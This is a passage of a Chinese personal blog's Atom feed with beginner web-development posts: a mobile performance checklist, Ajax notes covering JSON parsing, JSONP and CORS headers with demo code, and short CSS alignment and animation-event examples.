      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
      <category term="科幻" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%91%E5%B9%BB/"/>
    
      <category term="三体" scheme="http://www.wanglinzhizhi.me/tags/%E4%B8%89%E4%BD%93/"/>
    
  </entry>
  
  <entry>
    <title>移动性能</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%A7%BB%E5%8A%A8web%20%E6%80%A7%E8%83%BD/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/移动web 性能/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移动性能"><a href="#移动性能" class="headerlink" title="移动性能"></a>移动性能</h2><h3 id="要考虑Android低端机与2G网络场景下性能-注意！"><a href="#要考虑Android低端机与2G网络场景下性能-注意！" class="headerlink" title="要考虑Android低端机与2G网络场景下性能 注意！"></a>要考虑<code>Android</code>低端机与<code>2G</code>网络场景下性能 注意！</h3><p>发布前必要检查项</p>
<ul>
<li>所有图片必须有进行过压缩</li>
<li>考虑适度的有损压缩，如转化为80%质量的jpg图片</li>
<li>考虑把大图切成多张小图，常见在banner图过大的场景</li>
</ul>
<p>加载性能优化, 达到打开足够快</p>
<ul>
<li>数据离线化，考虑将数据缓存在 localStorage</li>
<li>初始请求资源数 <code>&lt; 4</code> 注意！</li>
<li>图片使用CSS Sprites 或 DataURI</li>
<li>外链 CSS 中避免 @import 引入</li>
<li>考虑内嵌小型的静态资源内容</li>
<li>初始请求资源gzip后总体积 <code>&lt; 50kb</code></li>
<li>静态资源(HTML/CSS/JS/Image)是否优化压缩？</li>
<li>避免打包大型类库</li>
<li>确保接入层已开启Gzip压缩（考虑提升Gzip级别，使用CPU开销换取加载时间） 注意！</li>
<li>尽量使用CSS3代替图片</li>
<li>初始首屏之外的静态资源（JS/CSS）延迟加载 注意！</li>
<li>初始首屏之外的图片资源按需加载（判断可视区域） 注意！</li>
<li>单页面应用(SPA)考虑延迟加载非首屏业务模块</li>
<li>开启Keep-Alive链路复用</li>
</ul>
<p>运行性能优化, 达到操作足够流畅</p>
<ul>
<li>避免 iOS 300+ms 点击延时问题 注意！</li>
<li>缓存 DOM 选择与计算</li>
<li>避免触发页面重绘的操作</li>
<li>Debounce连续触发的事件(scroll / resize / touchmove等)，避免高频繁触发执行 注意！</li>
<li>尽可能使用事件代理，避免批量绑定事件</li>
<li>使用CSS3动画代替JS动画</li>
<li>避免在低端机上使用大量CSS3渐变阴影效果，可考虑降级效果来提升流畅度</li>
<li>HTML结构层级保持足够简单</li>
<li>尽能少的使用CSS高级选择器与通配选择器</li>
<li>Keep it simple</li>
</ul>
<p>在线性能检测评定工具使用指南</p>
<ul>
<li>访问 <a href="http://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="external">Google PageSpeed</a> 在线评定网站</li>
<li>在地址栏输入目标URL地址，点击分析按钮开始检测</li>
<li>按 PageSpeed 分析出的建议进行优化，优先解决红色类别的问题</li>
</ul>
<p>推荐阅读</p>
<ul>
<li><a href="http://www.webperformancetoday.com/tag/mobile-web-performance/" target="_blank" rel="external">移动WEB性能</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/caching" target="_blank" rel="external">优化WEB缓存</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/rtt" target="_blank" rel="external">最小化RTT次数</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/payload" target="_blank" rel="external">最小化请求负载</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/rendering" target="_blank" rel="external">优化浏览器渲染</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;移动性能&quot;&gt;&lt;a href=&quot;#移动性能&quot; class=&quot;headerlink&quot; title=&quot;移动性能&quot;&gt;&lt;/a&gt;移动性能&lt;/h2&gt;&lt;h3 id=&quot;要考虑Android低端机与2G网络场景下性能-注意！&quot;&gt;&lt;a href=&quot;#要考虑Android低端机与2G网络
    
    </summary>
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/categories/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="移动性能" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8%E6%80%A7%E8%83%BD/"/>
    
      <category term="性能分析" scheme="http://www.wanglinzhizhi.me/tags/%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Web前端: Ajax Notes</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/Ajax%20Notes/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/Ajax Notes/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-07T13:04:59.000Z</updated>
    
    <content type="html"><![CDATA[<hr>

<h1 id="Ajax-Notes"><a href="#Ajax-Notes" class="headerlink" title="Ajax Notes"></a>Ajax Notes</h1><p>HTML和CSS 来实现页面，表达信息</p>
<p>运用XMLHttpRequest和web服务器进行数据的异步交换</p>
<p>用javascript 操作DOM,实现动态局部刷新</p>
<hr>

<h2 id="XMLHttpRequest-对象创建"><a href="#XMLHttpRequest-对象创建" class="headerlink" title="XMLHttpRequest 对象创建"></a>XMLHttpRequest 对象创建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var request=new XMLHttpRequest();</div></pre></td></tr></table></figure>
<hr>

<h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>无状态协议</p>
<p>Get请求:</p>
<ul>
<li>一般用于获取信息(一般用于查询信息)</li>
</ul>
<ul>
<li>使用URL传递参数</li>
</ul>
<ul>
<li>对所发送信息的数量也有限制,一般在2000个字符以内.</li>
</ul>
<p>Notes：GET请求是 幂等</p>
<p>POST请求(相对安全):</p>
<ul>
<li>一般用于修改服务器上 的资源</li>
</ul>
<ul>
<li>对所发送信息的数量无限制</li>
</ul>
<p>HTTP响应:</p>
<ol>
<li>数字和文字,状态码</li>
<li>响应头.和请求头一样包含许多有用的信息,服务器类型,日期时间,内容类型和长度等</li>
<li>响应体</li>
</ol>
<p>XMLHttpRequest发送请求</p>
<ul>
<li>open(method,url,async)</li>
</ul>
<ul>
<li>sent(string)</li>
</ul>
<p><strong>demo</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">request.open(&quot;POST&quot;,&quot;create.php&quot;,true);</div><div class="line">request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">request.send(&quot;name=wanglinzhizhi&amp;sex=male&quot;);</div></pre></td></tr></table></figure>
<p>Notes:request.setRequestHeader 这个必须要加,渲染方式</p>
<hr>

<h2 id="JSON的解析"><a href="#JSON的解析" class="headerlink" title="JSON的解析"></a>JSON的解析</h2><p>方法一 eval()方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var jsondata=&apos;&#123;&quot;staff&quot;:[&#123;&quot;name&quot;:&quot;洪七&quot;,&quot;age&quot;:70&#125;,&#123;&quot;name&quot;:&quot;郭靖&quot;,&quot;age&quot;:30&#125;,&#123;&quot;name&quot;:&quot;黄蓉&quot;,&quot;age&quot;:35&#125;]&#125;&apos;;</div><div class="line">var jsonobj=eval(&apos;(&apos;+jsondata+&apos;)&apos;);</div><div class="line">alert(jsonobj.staff[0].name);</div></pre></td></tr></table></figure>
<p>方法二(JSON.parse)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var jsondata=&apos;&#123;&quot;staff&quot;:[&#123;&quot;name&quot;:&quot;洪七&quot;,&quot;age&quot;:70&#125;,&#123;&quot;name&quot;:&quot;郭靖&quot;,&quot;age&quot;:30&#125;,&#123;&quot;name&quot;:&quot;黄蓉&quot;,&quot;age&quot;:35&#125;]&#125;&apos;;</div><div class="line">var jsonobj=JSON.parse(jsondata);</div><div class="line">alert(jsonobj.staff[0].name);</div></pre></td></tr></table></figure>
<p>推荐使用第二种方法</p>
<p>Note: <strong>无论何时使用eval时是非常危险的.</strong></p>
<p>JSON校验</p>
<p><a href="http://jsonlint.com/" target="_blank" rel="external">http://jsonlint.com/</a></p>
<p>Notes:CND加速的jquery库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=&quot;http://apps.bdimg.com/libs/jquery/1.11.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>// 使用了CDN加速,调用很快.</p>
<hr>

<h2 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h2><p>javascript出于安全方面的考虑，不允许跨域调用其他页面的对象。</p>
<p>什么是跨域呢？简单地理解就是因为javascript同源策略的限制，a.com域名下的js无法操作b.com或是c.a.com域名下的对象。</p>
<p>解决跨域问题的方法</p>
<ol>
<li><strong>代理</strong><br>通过在同域名下的web服务器端创建一个代理：<br>北京服务器(域名:www.beijing.com)<br>上海服务器(域名：www.shanghai.com)<br>比如在北京的web服务器的后台(www.beijing.com/proxy-shanghaiservice.php)来调用上海服务器(www.shanghai.com/services.php)的服务，然后再把访问结果返回给前端，这样前端调用北京同域名的服务就和调用上海的服务效果相同了。<br>​</li>
<li><strong>JSONP(只支持GET请求)：</strong></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=&quot;http://www.bbb.com/jsonp.js&quot;&gt;&lt;/script&gt;</div><div class="line">在www.aaa.com页面中</div><div class="line">&lt;script&gt;</div><div class="line">function jsonp(json)&#123;</div><div class="line">alert(json[&quot;name&quot;]);</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">在www.bbb.com页面中:</div><div class="line">jsonp(&#123;&quot;name&quot;:&quot;洪七公&quot;,&apos;age&apos;:24&#125;);</div><div class="line">jsonp只能对get请求起作用,不能对post请求起作用(不支持post请求)</div></pre></td></tr></table></figure>
<p>JSONP可用于解决主流浏览器的跨域数据访问的问题。<br>在www.aaa.com页面中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"> function jsonp(json)&#123;</div><div class="line">      alert(json[&quot;name&quot;]);</div><div class="line">  &#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;script src=&quot;http;//www.bbb.com/jsonp.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>在www.bbb.com页面中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">jsonp(&#123;&apos;name&apos;:&apos;xx&apos;,&apos;age&apos;:24&#125;)</div></pre></td></tr></table></figure>
<p>这样就可以实现在www.aaa.com客户端访问获取www.bbb.com所在服务器中的文件或数据,从而实现跨域</p>
<p><strong>3.XHR2</strong></p>
<p>HTML5 提供的XMLHttpRequest Level2已经实现了跨域访问以及其他一些新功能:</p>
<p>对于解决跨域问题,只需要对<strong>服务端</strong>做较小的改变, 客户端不需要做改变</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">header(&quot;Content-Type:application/json;charset=utf-8&quot;);</div><div class="line"></div><div class="line">header(&quot;Access-Control-Allow-Origin:*&quot;);</div><div class="line"></div><div class="line">header(&quot;Access-Control-Allow-Methods:POST,GET&quot;);</div></pre></td></tr></table></figure>
<p>Notes:</p>
<ol>
<li>HTML5提供的XMLHttpRequest Level2已经实现了跨域访问以及其他的一些新功能</li>
<li>IE10以下的版本都不支持</li>
<li>在服务器端</li>
</ol>
<p><strong>总结:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">跨域处理，三种方法：</div><div class="line">1、处理跨域方法一 代理</div><div class="line"></div><div class="line">2、处理跨域方式二——</div><div class="line"></div><div class="line">3、处理跨域的方法三——XHR2：</div><div class="line"></div><div class="line">header(&apos;Access-Control-Allow-Origin:*&apos;);</div><div class="line">header(&apos;Access-Control-Allow-Methods:POST,GET&apos;);</div></pre></td></tr></table></figure>
<hr>

<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>JavaScript原生版实现demo,这里只给出了ajax需要部分的代码,后端的 json已经前端的样式等内容都未写出来(因为太多了…)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"search"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  request.open(<span class="string">"GET"</span>, <span class="string">"serverjson.php?number="</span> + 	<span class="built_in">document</span>.getElementById(<span class="string">"keyword"</span>).value);</div><div class="line">  request.send();</div><div class="line"></div><div class="line">  request.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (request.readyState===<span class="number">4</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (request.status===<span class="number">200</span>) &#123;</div><div class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(request.responseText);</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"searchResult"</span>).innerHTML = data.msg;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"searchResult"</span>).innerHTML = <span class="string">"出现错误："</span> + data.msg;</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"发生错误："</span> + request.status);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"save"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  request.open(<span class="string">"POST"</span>, <span class="string">"serverjson.php"</span>);</div><div class="line">  <span class="keyword">var</span> data = <span class="string">"name="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffName"</span>).value</div><div class="line">  + <span class="string">"&amp;number="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffNumber"</span>).value</div><div class="line">  + <span class="string">"&amp;sex="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffSex"</span>).value</div><div class="line">  + <span class="string">"&amp;job="</span> + <span class="built_in">document</span>.getElementById(<span class="string">"staffJob"</span>).value;</div><div class="line">  request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">  request.send(data);</div><div class="line">  request.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (request.readyState===<span class="number">4</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (request.status===<span class="number">200</span>) &#123;</div><div class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(request.responseText);</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"createResult"</span>).innerHTML = data.msg;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"createResult"</span>).innerHTML = <span class="string">"出现错误："</span> + data.msg;</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"发生错误："</span> + request.status);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>jQuery版的实现</p>
<p>jQuery中封装了request.setRequestHeader(“Content-type”… 故不需要额外添加句代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  $(<span class="string">"#search"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">      <span class="attr">type</span>: <span class="string">"GET"</span>, 	</div><div class="line">      <span class="attr">url</span>: <span class="string">"http://127.0.0.1:8000/ajaxdemo/serverjsonp.php?number="</span> + $(<span class="string">"#keyword"</span>).val(),</div><div class="line">      <span class="attr">dataType</span>: <span class="string">"jsonp"</span>,</div><div class="line">      <span class="attr">jsonp</span>: <span class="string">"callback"</span>,</div><div class="line">      <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          $(<span class="string">"#searchResult"</span>).html(data.msg);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          $(<span class="string">"#searchResult"</span>).html(<span class="string">"出现错误："</span> + data.msg);</div><div class="line">        &#125;  </div><div class="line">      &#125;,</div><div class="line">      <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">jqXHR</span>)</span>&#123;     </div><div class="line">        alert(<span class="string">"发生错误："</span> + jqXHR.status);  </div><div class="line">      &#125;,     </div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  $(<span class="string">"#save"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">      <span class="attr">type</span>: <span class="string">"POST"</span>, 	</div><div class="line">      <span class="attr">url</span>: <span class="string">"http://127.0.0.1:8000/ajaxdemo/serverjsonp.php"</span>,</div><div class="line">      <span class="attr">data</span>: &#123;</div><div class="line">        <span class="attr">name</span>: $(<span class="string">"#staffName"</span>).val(),</div><div class="line">        <span class="attr">number</span>: $(<span class="string">"#staffNumber"</span>).val(),</div><div class="line">        <span class="attr">sex</span>: $(<span class="string">"#staffSex"</span>).val(),</div><div class="line">        <span class="attr">job</span>: $(<span class="string">"#staffJob"</span>).val()</div><div class="line">      &#125;,</div><div class="line">      <span class="attr">dataType</span>: <span class="string">"json"</span>,</div><div class="line">      <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span> (data.success) &#123;</div><div class="line">          $(<span class="string">"#createResult"</span>).html(data.msg);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          $(<span class="string">"#createResult"</span>).html(<span class="string">"出现错误："</span> + data.msg);</div><div class="line">        &#125;  </div><div class="line">      &#125;,</div><div class="line">      <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">jqXHR</span>)</span>&#123;     </div><div class="line">        alert(<span class="string">"发生错误："</span> + jqXHR.status);  </div><div class="line">      &#125;,     </div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;

&lt;h1 id=&quot;Ajax-Notes&quot;&gt;&lt;a href=&quot;#Ajax-Notes&quot; class=&quot;headerlink&quot; title=&quot;Ajax Notes&quot;&gt;&lt;/a&gt;Ajax Notes&lt;/h1&gt;&lt;p&gt;HTML和CSS 来实现页面，表达信息&lt;/p&gt;
&lt;p&gt;运用XML
    
    </summary>
    
      <category term="JS" scheme="http://www.wanglinzhizhi.me/categories/JS/"/>
    
    
      <category term="JS" scheme="http://www.wanglinzhizhi.me/tags/JS/"/>
    
      <category term="Ajax" scheme="http://www.wanglinzhizhi.me/tags/Ajax/"/>
    
  </entry>
  
  <entry>
    <title>CSS vertical-align 属性</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/CSS%20vertical-align%20%E5%9E%82%E7%9B%B4%E6%96%B9%E5%90%91%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9A%84%E5%B1%85%E4%B8%AD%20/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/CSS vertical-align 垂直方向多行文本的居中 /</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS-vertical-align-属性"><a href="#CSS-vertical-align-属性" class="headerlink" title="CSS vertical-align 属性"></a>CSS vertical-align 属性</h2><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">div</span>&#123;</div><div class="line">  </div><div class="line">true<span class="attribute">vertical-align</span>:middle	<span class="comment">/*把此元素放置在父元素的中部。*/</span></div><div class="line">  	display:table-cell;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS-vertical-align-属性&quot;&gt;&lt;a href=&quot;#CSS-vertical-align-属性&quot; class=&quot;headerlink&quot; title=&quot;CSS vertical-align 属性&quot;&gt;&lt;/a&gt;CSS vertical-align 属性&lt;/
    
    </summary>
    
      <category term="web" scheme="http://www.wanglinzhizhi.me/categories/web/"/>
    
    
      <category term="CSS" scheme="http://www.wanglinzhizhi.me/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>CSS3 AnimateEnd 事件</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/CSS3%20AnimateEnd%E4%BA%8B%E4%BB%B6/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/CSS3 AnimateEnd事件/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS3-AnimateEnd-事件"><a href="#CSS3-AnimateEnd-事件" class="headerlink" title="CSS3 AnimateEnd 事件"></a>CSS3 AnimateEnd 事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> </span></div><div class="line"><span class="selector-id">#myD</span>&#123;</div><div class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</div><div class="line">    <span class="attribute">width</span>: <span class="number">550px</span>;</div><div class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</div><div class="line">    <span class="attribute">background</span>: orange;</div><div class="line">    <span class="attribute">position</span>: relative;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/* Chrome, Safari, Opera */</span></div><div class="line">@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> mymove &#123;</div><div class="line">    <span class="selector-tag">from</span> &#123;<span class="attribute">top</span>: <span class="number">0px</span>;&#125;</div><div class="line">    <span class="selector-tag">to</span> &#123;<span class="attribute">top</span>: <span class="number">200px</span>;&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">@<span class="keyword">keyframes</span> mymove &#123;</div><div class="line">    <span class="selector-tag">from</span> &#123;<span class="attribute">top</span>: <span class="number">0px</span>;&#125;</div><div class="line">    <span class="selector-tag">to</span> &#123;<span class="attribute">top</span>: <span class="number">200px</span>;&#125;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>使用addEventListener()方法给div元素添加"animationstart事件、animationiteration事件、animationend事件<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myD"</span> <span class="attr">onclick</span>=<span class="string">"myFc()"</span>&gt;</span>点击这里开始播放动画<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line">  </div><div class="line">  </div><div class="line">  </div><div class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.getElementById(<span class="string">"myD"</span>);</div><div class="line"><span class="comment">// 使用JavaScript播放动画</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFc</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    x.style.WebkitAnimation = <span class="string">"mymove 4s 2"</span>; <span class="comment">// 用于Chrome、 Safari、 Opera浏览器</span></div><div class="line">    x.style.animation = <span class="string">"mymove 4s 2"</span>;       <span class="comment">// 标准语法</span></div><div class="line">    &#125;</div><div class="line"><span class="comment">// Chrome、 Safari、 Opera</span></div><div class="line">x.addEventListener(<span class="string">"webkitAnimationStart"</span>, myStartFunction);</div><div class="line">x.addEventListener(<span class="string">"webkitAnimationIteration"</span>, myRepeatFunction);</div><div class="line">x.addEventListener(<span class="string">"webkitAnimationEnd"</span>, myEndFunction);</div><div class="line"><span class="comment">// 标准语法</span></div><div class="line">x.addEventListener(<span class="string">"animationstart"</span>, myStartFunction);</div><div class="line">x.addEventListener(<span class="string">"animationiteration"</span>, myRepeatFunction);</div><div class="line">x.addEventListener(<span class="string">"animationend"</span>, myEndFunction);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myStartFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"触发了animationstart事件 - 开始播放动画"</span>;</div><div class="line">    <span class="keyword">this</span>.style.backgroundColor = <span class="string">"pink"</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myRepeatFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"触发了animationiteration事件 -动画重复播放了！"</span>;</div><div class="line">    <span class="keyword">this</span>.style.backgroundColor = <span class="string">"lightblue"</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">myEndFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"触发了animationend event occured -动画播放完毕"</span>;</div><div class="line">    <span class="keyword">this</span>.style.backgroundColor = <span class="string">"lightgray"</span>;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  </div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSS3-AnimateEnd-事件&quot;&gt;&lt;a href=&quot;#CSS3-AnimateEnd-事件&quot; class=&quot;headerlink&quot; title=&quot;CSS3 AnimateEnd 事件&quot;&gt;&lt;/a&gt;CSS3 AnimateEnd 事件&lt;/h2&gt;&lt;figure c
    
    </summary>
    
      <category term="web" scheme="http://www.wanglinzhizhi.me/categories/web/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="JS" scheme="http://www.wanglinzhizhi.me/tags/JS/"/>
    
      <category term="移动web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8web/"/>
    
      <category term="动画" scheme="http://www.wanglinzhizhi.me/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
  <entry>
    <title>CSS动画简介</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/CSS%E5%8A%A8%E7%94%BB%E7%AE%80%E4%BB%8B%20%E9%98%AE%E4%B8%80%E5%B3%B0/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/CSS动画简介 阮一峰/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSS动画简介"><a href="#CSS动画简介" class="headerlink" title="CSS动画简介"></a>CSS动画简介</h2><p>作者： <a href="http://www.ruanyifeng.com/" target="_blank" rel="external">阮一峰</a></p>
<p>日期： <a href="http://www.ruanyifeng.com/blog/2014/02/" target="_blank" rel="external">2014年2月14日</a></p>
<p>现在，我很少写介绍CSS的文章，因为感觉网站开发的关键还是在服务器端。</p>
<p>但是，CSS动画除外，它实在太有用了。</p>
<p><img src="http://image.beekka.com/blog/201402/bg2014021402.png" alt="img"></p>
<p>本文介绍CSS动画的两大组成部分：transition和animation。我不打算给出每一条属性的详尽介绍，那样可以写一本书。这篇文章只是一个简介，帮助初学者了解全貌，同时又是一个快速指南，当你想不起某一个用法的时候，能够快速地找到提示。</p>
<p>我的主要参考资料是，2013年10月，<a href="http://lea.verou.me/" target="_blank" rel="external">Lea Verou</a>在JSConf.Asia上面的演讲<a href="http://2013.jsconf.asia/blog/2013/10/31/jsconfasia-2013-lea-verou-css-in-the-4th-dimension-not-your-daddys-css-animations" target="_blank" rel="external">《CSS in the 4th Dimension》</a>。那是一个非常棒的演讲，有<a href="https://www.youtube.com/watch?v=NTJUFQmHbvc" target="_blank" rel="external">视频</a>和<a href="http://lea.verou.me/css-4d/" target="_blank" rel="external">幻灯片</a>，强烈推荐。</p>
<p><br></p>
<p><br></p>
<p><br></p>
<p><br></p>
